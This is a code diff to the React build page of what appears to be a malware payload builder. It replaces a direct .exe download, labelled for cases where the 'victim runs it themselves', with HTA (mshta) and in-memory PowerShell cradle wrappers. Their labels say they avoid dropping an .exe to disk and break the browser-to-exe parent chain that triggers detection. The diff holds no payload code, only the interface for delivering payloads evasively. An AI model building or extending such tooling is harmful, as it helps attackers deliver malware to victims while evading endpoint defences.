@@ -472,16 +472,31 @@ export function BuildPage() {
                       {b.status === 'complete' && b.artifact_url && (
                         <div className="flex flex-col gap-1.5">
                           <div className="flex items-baseline gap-2">
-                            <a
-                              href={b.artifact_url}
-                              style={{ color: 'var(--dm-blue)', fontSize: '0.72rem', textDecoration: 'none', transition: 'color 0.1s', flexShrink: 0 }}
+                            <button
+                              type="button"
+                              onClick={() => downloadWrap(b.id, 'hta')}
+                              style={{ background: 'none', border: 'none', padding: 0, cursor: 'pointer', color: 'var(--dm-amber)', fontSize: '0.72rem', transition: 'color 0.1s', flexShrink: 0 }}
                               onMouseEnter={e => (e.currentTarget.style.color = 'var(--dm-accent)')}
-                              onMouseLeave={e => (e.currentTarget.style.color = 'var(--dm-blue)')}
+                              onMouseLeave={e => (e.currentTarget.style.color = 'var(--dm-amber)')}
                             >
-                              ↓ exe
-                            </a>
+                              ↓ hta
+                            </button>
                             <span style={{ color: 'var(--dm-text-lo)', fontSize: '0.65rem' }}>
-                              direct payload — use when victim runs it themselves (Explorer, USB, internal share)
+                              mshta loader — no .exe extension, runs via mshta.exe
+                            </span>
+                          </div>
+                          <div className="flex items-baseline gap-2">
+                            <button
+                              type="button"
+                              onClick={() => downloadWrap(b.id, 'ps1')}
+                              style={{ background: 'none', border: 'none', padding: 0, cursor: 'pointer', color: 'var(--dm-amber)', fontSize: '0.72rem', transition: 'color 0.1s', flexShrink: 0 }}
+                              onMouseEnter={e => (e.currentTarget.style.color = 'var(--dm-accent)')}
+                              onMouseLeave={e => (e.currentTarget.style.color = 'var(--dm-amber)')}
+                            >
+                              ↓ ps1
+                            </button>
+                            <span style={{ color: 'var(--dm-text-lo)', fontSize: '0.65rem' }}>
+                              PowerShell cradle — in-memory, no .exe dropped to disk
                             </span>
                           </div>
                           <div className="flex items-baseline gap-2">
@@ -495,7 +510,7 @@ export function BuildPage() {
                               ↓ js
                             </button>
                             <span style={{ color: 'var(--dm-text-lo)', fontSize: '0.65rem' }}>
-                              wscript wrapper — use when browser is the delivery vector; breaks Chrome→exe parent chain that triggers ATD
+                              wscript wrapper — breaks Chrome→exe parent chain that triggers ATD
                             </span>
                           </div>
                         </div>
